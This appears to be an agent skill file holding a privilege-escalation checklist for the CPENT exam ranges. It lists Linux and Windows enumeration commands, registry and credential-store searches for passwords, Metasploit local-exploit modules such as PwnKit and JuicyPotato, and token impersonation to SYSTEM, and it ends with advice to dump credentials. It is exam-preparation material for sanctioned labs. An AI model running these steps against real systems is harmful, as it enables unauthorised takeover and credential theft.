---
name: privilege-escalation
description: Linux and Windows privilege escalation checklists for CPENT — applies inside every range. Use on every unprivileged shell. SUID/sudo/caps/cron/kernel on Linux; token privileges/services/registry on Windows.
---

# Privilege Escalation (Zone 7, 10% — but applies in EVERY range)

Every unprivileged shell is half-done. Drill these until automatic. Run the checklist
*before* reaching for exploits.

## Linux — run immediately

```
id                                             # user + groups (lxd/docker/disk = path)
sudo -l                                         # check EVERY entry on GTFOBins
find / -perm -4000 -type f 2>/dev/null          # SUID → GTFOBins
getcap -r / 2>/dev/null                          # cap_setuid/cap_dac_override etc.
cat /etc/crontab; ls -la /etc/cron*             # writable cron jobs
uname -a                                        # kernel → DirtyPipe/DirtyCow/PwnKit
find / -writable -type f 2>/dev/null            # writable sensitive files
ls -la /etc/passwd                              # writable? add root-equiv user
```

Automate: `linpeas.sh`, `linux-exploit-suggester.sh`. Read output carefully — don't just
grep for red.

## Windows — run immediately

```
whoami /priv          # SeImpersonate → PrintSpoofer.exe -i -c cmd / GodPotato
whoami /groups        # Backup Operators / DnsAdmins / Server Operators = paths
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
accesschk.exe /accepteula -uwcqv "Users" *      # weak service perms (or PowerUp.ps1)
cmdkey /list ; reg query HKLM /f password /t REG_SZ /s   # stored creds
```

Automate: `winPEASx64.exe`, `PowerUp.ps1` (`Invoke-AllChecks`).

## Metasploit local privesc modules

From a Meterpreter session, background it and try:
```
# Auto-suggest
use post/multi/recon/local_exploit_suggester
set SESSION <id>; run

# Common Windows escalation
use exploit/windows/local/ms16_075_reflection_juicy    # JuicyPotato
use exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move
use exploit/windows/local/always_install_elevated
use exploit/windows/local/service_permissions           # weak service perms
use exploit/windows/local/unquoted_service_path

# Common Linux escalation
use exploit/linux/local/cve_2021_4034_pwnkit            # PwnKit (pkexec)
use exploit/linux/local/sudo_baron_samedit              # CVE-2021-3156
use exploit/linux/local/overlayfs_priv_esc

# Token impersonation (from Meterpreter)
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

## After escalating

Prove it: `whoami` / `id`, `hostname`, `ip a` — this is your screenshot proof. Re-run the
host-triage block as root/SYSTEM (new creds, new routes), dump creds, update the tracker,
and write the finding. Don't leave a box at user when SYSTEM/root is reachable.
